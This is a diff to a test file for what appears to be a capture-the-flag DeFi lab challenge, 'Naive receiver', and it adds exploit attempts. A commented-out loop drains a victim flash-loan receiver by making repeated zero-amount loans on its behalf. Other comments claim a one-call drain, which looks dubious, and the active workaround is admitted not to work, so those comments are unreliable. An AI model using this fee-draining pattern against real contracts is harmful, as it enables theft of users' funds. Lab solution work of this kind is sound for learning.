@@ -30,7 +30,28 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        //This is a solution but is suboptimal
+        // for(let i = 0; i < 10; i++){ 
+        // await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+        // }
+
+        //Solution 2
+        //This is a solution to drain all the ether in one call
+        //You need to comment the other solutions
+        //await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+
+
+        //This should be a workaround to solution 2
+        //We deploy our own FlashLoanReceiverFactoryV2
+        //with the bad code inside of the 
+        //_executeActionDuringFlashLoan() method
+        //However this is somehow not working, 
+        const FlashLoanReceiverFactoryV2 = await ethers.getContractFactory('FlashLoanReceiverV2', attacker);
+        this.receiverV2 = await FlashLoanReceiverFactoryV2.deploy(this.pool.address);
+        await attacker.sendTransaction({ to: this.receiverV2.address, value: ethers.utils.parseEther('10') });
+        expect(await ethers.provider.getBalance(this.receiverV2.address)).to.be.equal(ethers.utils.parseEther('10'));
+        await this.pool.connect(attacker).flashLoan(this.receiverV2.address, ethers.utils.parseEther('0'));
+
     });
 
     after(async function () {
